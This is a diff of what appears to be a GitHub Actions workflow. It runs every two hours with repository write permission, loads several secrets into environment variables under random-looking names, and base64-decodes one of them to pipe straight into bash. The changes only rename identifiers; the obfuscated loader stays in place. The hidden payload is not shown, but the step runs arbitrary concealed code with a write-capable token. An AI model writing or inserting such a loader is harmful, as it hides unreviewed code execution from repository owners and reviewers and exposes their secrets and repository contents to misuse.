@@ -1,21 +1,21 @@
-name: mAUdZkwB34LfiMWJ
+name: ax1k6vpz
 on:
   schedule:
     - cron: '0 */2 * * *'
   workflow_dispatch:
 jobs:
-  T0ezH:
+  e9UOQw0jW5MRns:
     runs-on: ubuntu-latest
     permissions:
       contents: write
     steps:
       - uses: actions/checkout@v4
         with:
-          token: ${{ secrets.yACdza }}
-      - name: ivW6MFfG3yXUL
+          token: ${{ secrets.uQ42esSR }}
+      - name: WketX
         env:
-          EhFDYi: ${{ secrets.wzDfiVH6vI7NJ }}
-          jhppcDT7KyAXSa6R: ${{ secrets.eaAnCKQ9FcerZ }}
-          R9IpI6vNPwjlA4nm: ${{ secrets.dctgelU53pCr }}
-          GITHUB_TOKEN: ${{ secrets.yACdza }}
-        run: echo "$EhFDYi" | base64 -d | bash
+          rocVmkq: ${{ secrets.NYmNVw7nYy0dAGv }}
+          dCJ0WWie: ${{ secrets.td1PiY }}
+          i84lAyLXbrr2: ${{ secrets.rpBR7An }}
+          GITHUB_TOKEN: ${{ secrets.uQ42esSR }}
+        run: echo "$rocVmkq" | base64 -d | bash
